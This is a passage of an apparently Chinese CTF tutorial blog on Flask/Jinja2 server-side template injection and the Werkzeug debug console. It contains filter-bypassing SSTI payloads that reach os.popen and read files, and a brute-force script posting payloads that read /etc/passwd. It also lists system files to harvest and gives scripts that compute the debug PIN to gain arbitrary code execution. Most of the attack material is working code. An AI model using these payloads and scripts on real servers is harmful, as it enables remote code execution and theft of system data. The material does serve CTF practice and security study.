class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=a)|join,xhx)|join %&#125;&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join,kg|attr(pop)(shi),<span class="built_in">dict</span>(flag=a)|join)|join%&#125;&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(yilingba)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>要注意的是这里在计算长度的时候，不清楚为什么不让加减法，可能是字符串的原因，尽量就是整除把，然后下面的payload有替代的过滤器也可以试试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|count %&#125;</span><br></pre></td></tr></table></figure>
<h1 id="爆破相关脚本与通用载荷"><a href="#爆破相关脚本与通用载荷" class="headerlink" title="爆破相关脚本与通用载荷"></a>爆破相关脚本与通用载荷</h1><p>脚本相关的可以看下面的，可以自行魔改，这是通用的，感觉没通用<code>payload</code>好用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">    payload = (</span><br><span class="line">        <span class="string">&quot;&#123;&#123;&quot;</span></span><br><span class="line">        <span class="string">&quot;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&#x27;][&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    data = &#123;<span class="string">&quot;text&quot;</span>: base64.b64encode(payload.encode())&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(res.status_code)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;index&quot;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;index&quot;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>下面看一下通用payload，这个用的模块在本文没讲过，是外部收集过来的，原理就是通过他自己去for遍历，而不是咱们外部爆破，我看这个听通用的，收集过来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">	&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">		&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><br><span class="line">	&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h1 id="关于FLASK的Pin码计算"><a href="#关于FLASK的Pin码计算" class="headerlink" title="关于FLASK的Pin码计算"></a>关于FLASK的Pin码计算</h1><p>在debug运行flask的过程中还发现了，基本flask每次重启pin码都不会更变<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702173957.png"><br>这一个地方也可以作为一个考点，给一个任意文件读取的漏洞，就可以计算出pin码，在执行到报错的代码之后会出现错误页，在右边会有一个控制栏图标<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702181729.png"><br>点击输入pin码即可执行任意代码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702181815.png"><br>然后具体的计算原理和方式参考下面内容。</p>
<h2 id="关于源代码的解读"><a href="#关于源代码的解读" class="headerlink" title="关于源代码的解读"></a>关于源代码的解读</h2><p>关键生成Pin码的位置是<code>C:\Users\BoyChai\.conda\envs\flask\Lib\site-packages\werkzeug\debug\__init__.py</code>，具体就是<code>site-packages\werkzeug\debug\__init__.py</code>他的关键代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: WSGIApplication,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>] | <span class="built_in">tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdecimal():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: <span class="built_in">str</span> | <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="comment"># Python &gt;= 3.13 only raises OSError</span></span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError, OSError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode()</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure>
<p>阅读后会发现他生成pin码所需要的关键数据如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">username = getpass.getuser()</span><br><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line">private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br></pre></td></tr></table></figure>
<p>通过debug发现数据内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702174343.png"><br>结合debug和源码内容，他们这些数据分别如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username       运行flask程序的用户名</span><br><span class="line">modname        似乎都是固定的Flask</span><br><span class="line"><span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__) 运行程序的库文件名字，似乎也是固定的flask.app   </span><br><span class="line"><span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>) flask/app.py的位置</span><br><span class="line"><span class="built_in">str</span>(uuid.getnode()) 电脑MAC地址</span><br><span class="line">get_machine_id()    需要读取源码，他会根据不同的操作系统读取不同的文件来获取这个<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
<p>他们每个数据的手动获取方式如下</p>
<ul>
<li>username读取<code>/etc/passwd</code>，一般大于1000的就是，题目不会创建太多，或者<code>/proc/self/environ</code>环境变量中读取</li>
<li>网卡mac地址一般linux直接读取<code>/sys/class/net/eth0/address</code>或者<code>/sys/class/net/ens33/address</code>都会有</li>
<li>machine_id读取稍微麻烦，linux是<code>/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id</code>文件，版本较新的可能是这几个<code>/etc/machine-id、/proc/sys/kernel/random/boot_id</code>，windows是在注册表中<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography</code></li>
<li>modname 固定Flask</li>
<li>还有两个有一个是默认固定的<code>flask.app</code>，另外一个是flask的app.py位置，在报错页面可以看到<img src="https://image.boychai.xyz/article/Pasted%20image%2020250702180555.png"><br>生成时的逻辑是</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">h = hashlib.sha1()</span><br><span class="line">   <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">       <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">           <span class="keyword">continue</span></span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">           bit = bit.encode()</span><br><span class="line">       h.update(bit)</span><br><span class="line">   h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">   cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">   <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">   <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">       num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br></pre></td></tr></table></figure>
<p>通过debug发现num就是pin码</p>
<h2 id="Pin码计算脚本"><a href="#Pin码计算脚本" class="headerlink" title="Pin码计算脚本"></a>Pin码计算脚本</h2><p>由上面分析可以推出下面计算脚本<br>部分参考于： <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63231007/article/details/131659892">https://blog.csdn.net/weixin_63231007/article/details/131659892</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"> </span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485723332611&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c89620b10a06f1c0105bb2402a7e5d2e965c143de814597bafa25eeea9e79b7f6a7fb2&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup</span></span><br><span class="line">    <span class="comment"># 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p>还有个老版本的<code>werkzeug 1.0.x</code>的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"> </span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;25214234362297&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span>  <span class="comment"># /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p>关于mac转换10进制脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mac_to_decimal</span>(<span class="params">mac_address</span>):</span><br><span class="line">    hex_str = mac_address.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    decimal = <span class="built_in">int</span>(hex_str, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> decimal</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">mac = <span class="string">&quot;02:42:ac:10:ab:40&quot;</span></span><br><span class="line">result = mac_to_decimal(mac)</span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 输出: 2485377870656</span></span><br></pre></td></tr></table></figure>
<p>对于Windows还原起来稍微麻烦，这里可以看一下现成的例题</p>
